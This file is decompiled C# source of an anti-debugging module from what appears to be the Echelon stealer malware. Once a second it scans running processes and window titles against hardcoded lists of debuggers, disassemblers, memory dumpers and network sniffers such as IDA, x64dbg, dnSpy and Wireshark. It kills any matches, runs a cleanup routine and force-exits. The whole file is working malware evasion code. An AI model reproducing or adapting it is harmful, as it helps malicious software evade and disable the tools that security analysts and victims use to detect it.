using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using Echelon.Global.Protect;

namespace Echelon.Global
{
	// Token: 0x02000053 RID: 83
	internal class AntiDebug
	{
		// Token: 0x060001EF RID: 495 RVA: 0x000099E6 File Offset: 0x00007BE6
		public static void StartAn()
		{
			for (;;)
			{
				AntiDebug.ScanAndKill();
				if (DebugProtect1.PerformChecks() == 1)
				{
					AntiDebug.badExit();
				}
				if (DebugProtect2.PerformChecks() == 1)
				{
					AntiDebug.badExit();
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x00009A16 File Offset: 0x00007C16
		public static void ScanAndKill()
		{
			if (AntiDebug.Scan(true) != 0)
			{
				AntiDebug.badExit();
			}
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x00009A25 File Offset: 0x00007C25
		public static void badExit()
		{
			if (Program.debugExit)
			{
				Clean.GetClean();
				Environment.FailFast("fuck you");
			}
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x000215CC File Offset: 0x0001F7CC
		private static int Scan(bool KillProcess)
		{
			int result = 0;
			if (AntiDebug.Process_Pidor_List.Count == 0 && AntiDebug.Window_Pidor_List.Count == 0)
			{
				AntiDebug.Init();
			}
			foreach (Process process in Process.GetProcesses())
			{
				if (AntiDebug.Process_Pidor_List.Contains(process.ProcessName) || AntiDebug.Window_Pidor_List.Contains(process.MainWindowTitle))
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("Найден чмошник: " + process.ProcessName);
					result = 1;
					if (KillProcess)
					{
						try
						{
							process.Kill();
							goto IL_8C;
						}
						catch
						{
							goto IL_8C;
						}
						goto IL_86;
					}
					IL_8C:
					if (Program.debugExit)
					{
						break;
					}
				}
				IL_86:;
			}
			return result;
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x00021680 File Offset: 0x0001F880
		private static int Init()
		{
			if (AntiDebug.Process_Pidor_List.Count > 0 && AntiDebug.Window_Pidor_List.Count > 0)
			{
				return 1;
			}
			AntiDebug.Process_Pidor_List.Add("ollydbg");
			AntiDebug.Process_Pidor_List.Add("ida");
			AntiDebug.Process_Pidor_List.Add("ida64");
			AntiDebug.Process_Pidor_List.Add("idag");
			AntiDebug.Process_Pidor_List.Add("idag64");
			AntiDebug.Process_Pidor_List.Add("idaw");
			AntiDebug.Process_Pidor_List.Add("idaw64");
			AntiDebug.Process_Pidor_List.Add("idaq");
			AntiDebug.Process_Pidor_List.Add("idaq64");
			AntiDebug.Process_Pidor_List.Add("idau");
			AntiDebug.Process_Pidor_List.Add("idau64");
			AntiDebug.Process_Pidor_List.Add("scylla");
			AntiDebug.Process_Pidor_List.Add("scylla_x64");
			AntiDebug.Process_Pidor_List.Add("scylla_x86");
			AntiDebug.Process_Pidor_List.Add("protection_id");
			AntiDebug.Process_Pidor_List.Add("x64dbg");
			AntiDebug.Process_Pidor_List.Add("x32dbg");
			AntiDebug.Process_Pidor_List.Add("windbg");
			AntiDebug.Process_Pidor_List.Add("reshacker");
			AntiDebug.Process_Pidor_List.Add("ImportREC");
			AntiDebug.Process_Pidor_List.Add("IMMUNITYDEBUGGER");
			AntiDebug.Process_Pidor_List.Add("MegaDumper");
			AntiDebug.Process_Pidor_List.Add("4fr33");
			AntiDebug.Process_Pidor_List.Add("HTTPAnalyzerStdV7");
			AntiDebug.Process_Pidor_List.Add("ProcessHacker");
			AntiDebug.Process_Pidor_List.Add("ExtremeDumper");
			AntiDebug.Process_Pidor_List.Add("dnSpy");
			AntiDebug.Process_Pidor_List.Add("dnSpy-x86");
			AntiDebug.Process_Pidor_List.Add("netstat");
			AntiDebug.Process_Pidor_List.Add("netmon");
			AntiDebug.Process_Pidor_List.Add("tcpview");
			AntiDebug.Process_Pidor_List.Add("regmon");
			AntiDebug.Window_Pidor_List.Add("OLLYDBG");
			AntiDebug.Window_Pidor_List.Add("anvir");
			AntiDebug.Window_Pidor_List.Add("fiddler");
			AntiDebug.Window_Pidor_List.Add("effetech http sniffer");
			AntiDebug.Window_Pidor_List.Add("firesheep");
			AntiDebug.Window_Pidor_List.Add("IEWatch");
			AntiDebug.Window_Pidor_List.Add("dumpcap");
			AntiDebug.Window_Pidor_List.Add("wireshark");
			AntiDebug.Window_Pidor_List.Add("ida");
			AntiDebug.Window_Pidor_List.Add("disassembly");
			AntiDebug.Window_Pidor_List.Add("scylla");
			AntiDebug.Window_Pidor_List.Add("Debug");
			AntiDebug.Window_Pidor_List.Add("[CPU");
			AntiDebug.Window_Pidor_List.Add("Immunity");
			AntiDebug.Window_Pidor_List.Add("WinDbg");
			AntiDebug.Window_Pidor_List.Add("x32dbg");
			AntiDebug.Window_Pidor_List.Add("x64dbg");
			AntiDebug.Window_Pidor_List.Add("Import reconstructor");
			AntiDebug.Window_Pidor_List.Add("MegaDumper");
			AntiDebug.Window_Pidor_List.Add("MegaDumper 1.0 by CodeCracker / SnD");
			return 0;
		}

		// Token: 0x0400010D RID: 269
		private static HashSet<string> Process_Pidor_List = new HashSet<string>();

		// Token: 0x0400010E RID: 270
		private static HashSet<string> Window_Pidor_List = new HashSet<string>();
	}
}
